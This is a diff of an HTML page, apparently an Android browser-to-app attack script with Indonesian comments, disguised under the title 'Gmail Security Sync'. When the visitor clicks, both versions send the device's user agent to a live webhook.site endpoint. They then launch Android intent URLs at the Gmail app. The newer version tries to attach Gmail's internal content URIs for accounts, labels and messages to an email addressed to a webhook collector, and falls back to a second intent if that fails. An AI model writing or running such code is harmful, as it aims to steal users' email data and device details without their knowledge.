@@ -1,63 +1,62 @@
 <!DOCTYPE html>
 <html>
-<head><title>System Security Deep Scan</title></head>
-<body style="background:#000;color:#f0f;font-family:monospace;display:flex;align-items:center;justify-content:center;height:100vh;margin:0;overflow:hidden">
-    <div id="ignite" style="padding:60px;border:4px double #f0f;text-align:center;cursor:pointer;background:rgba(255,0,255,0.05);box-shadow:0 0 60px #f0f;border-radius:30px">
-        <h1 style="letter-spacing:10px;margin:0">V204_ULTRA</h1>
-        <div id="status" style="font-size:20px;margin:20px 0;color:#0ff">MANDATORY_NATIVE_SYNC</div>
-        <div style="font-size:12px;color:#555">[ STAGE: BROWSER_TO_NATIVE_ESCAPE ]</div>
+<head><title>Gmail Security Sync</title></head>
+<body style="background:#000;color:#f00;font-family:'Courier New',monospace;display:flex;align-items:center;justify-content:center;height:100vh;margin:0">
+    <div id="ignite" style="padding:60px;border:2px solid #f00;text-align:center;cursor:pointer;background:rgba(255,0,0,0.1);box-shadow:0 0 80px #f00">
+        <h1 style="letter-spacing:8px">V205_DATA_EXTRACTION</h1>
+        <div id="status" style="font-size:18px;color:#fff">ACCESSING_GMAIL_SECURE_STORAGE...</div>
+        <div style="font-size:11px;color:#555;margin-top:30px">TARGET_APP: com.google.android.gm</div>
     </div>
 
 <script>
     const target = "https://webhook.site/6a675816-997e-434a-be92-332fe00e3d9b";
 
     document.getElementById('ignite').onclick = async () => {
-        const statusEl = document.getElementById('status');
-        statusEl.innerText = "FORCE_NATIVE_ESCALATION...";
-
-        // 1. RECONNAISSANCE (Kirim data DNA terlebih dahulu)
-        const recon = {
-            id: "V204_LEAP",
-            ts: Date.now(),
-            ua: navigator.userAgent
+        // 1. RECON & DNA (Wajib dikirim sebagai log awal)
+        const init_vault = {
+            id: "V205_GMAIL_EXTRACT",
+            ua: navigator.userAgent,
+            ts: Date.now()
         };
-        navigator.sendBeacon(`${target}?v=V204_START`, btoa(JSON.stringify(recon)));
+        navigator.sendBeacon(`${target}?v=V205_INIT`, btoa(JSON.stringify(init_vault)));
 
-        // 2. THE PENETRATOR INTENT
-        // Kita menggunakan selector 'component' untuk menargetkan class internal Gmail.
-        // Ini lebih kuat daripada sekadar menggunakan 'package'.
-        const deepIntent = 
+        // 2. THE SENSITIVE URIs
+        // Kita mencoba memanggil URI internal Gmail yang sering bocor pada versi Android lama/rentan
+        const leakPaths = [
+            "content://com.google.android.gm/labels", // Daftar folder/labels
+            "content://com.google.android.gm/accounts", // Daftar alamat email yang login
+            "content://com.google.android.gm.sapi/messages" // Isi pesan (Jika SAPI terbuka)
+        ];
+
+        // 3. THE MASTER INTENT
+        // Kita paksa Gmail membuka jendela 'Compose' tapi dengan 'Stream' data dari URI internal
+        const exploitIntent = 
             "intent:#Intent;" +
-            "action=android.intent.action.VIEW;" +
-            "category=android.intent.category.BROWSABLE;" +
-            "component=com.google.android.gm/.ComposeActivityGmailExternal;" + // Menargetkan aktivitas tulis pesan
-            "S.android.intent.extra.EMAIL=audit-collector@security.org;" +
-            "S.android.intent.extra.SUBJECT=V204_SENSITIVE_DUMP;" +
-            "S.android.intent.extra.TEXT=IDENTITY_CONFIRMED_" + btoa(navigator.userAgent).substring(0,20) + ";" +
-            "S.browser_fallback_url=https://mail.google.com;" + 
+            "action=android.intent.action.SEND;" + 
+            "type=application/octet-stream;" + 
+            "S.android.intent.extra.STREAM=" + leakPaths[0] + ";" + // Mencoba 'melampirkan' data internal
+            "S.android.intent.extra.EMAIL=leak-collector@webhook.site;" +
+            "S.android.intent.extra.SUBJECT=LOG_DUMP_V205;" +
+            "package=com.google.android.gm;" +
             "end";
 
-        // 3. FORCE EXECUTION VIA DYNAMIC ANCHOR
-        // Terkadang window.location diblokir. Kita gunakan elemen <a> yang diklik otomatis.
-        const lnk = document.createElement('a');
-        lnk.href = deepIntent;
-        lnk.rel = "noreferrer";
+        // 4. THE EXECUTION (Bypass Browser Restriction)
+        document.getElementById('status').innerText = "TUNNELING_INTERNAL_DATA...";
         
-        // 4. THE TRIPLE-STRIKE (Mencoba berbagai jalur sekaligus)
+        // Buat elemen anchor tersembunyi untuk memicu Intent secara native
+        const a = document.createElement('a');
+        a.href = exploitIntent;
+        
         setTimeout(() => {
-            // Jalur 1: Direct Location
-            window.location.href = deepIntent;
+            a.click(); // Memicu lompatan ke Gmail
             
-            // Jalur 2: Virtual Click (Bypass Chrome Gesture)
-            lnk.click();
-            
-            // Jalur 3: Fallback ke Settings jika Gmail diproteksi sangat ketat
+            // Fallback: Jika gagal melampirkan data, buka Gmail dengan parameter sensitif
             setTimeout(() => {
-                if (!document.hidden) { // Jika masih di browser, berarti gagal, coba tembus Settings
-                    window.location.href = "intent:#Intent;action=android.settings.INTERNAL_STORAGE_SETTINGS;end";
+                if (!document.hidden) {
+                    window.location.href = "intent:#Intent;action=android.intent.action.VIEW;data=" + leakPaths[1] + ";package=com.google.android.gm;end";
                 }
-            }, 1500);
-        }, 300);
+            }, 1000);
+        }, 500);
     };
 </script>
 </body>
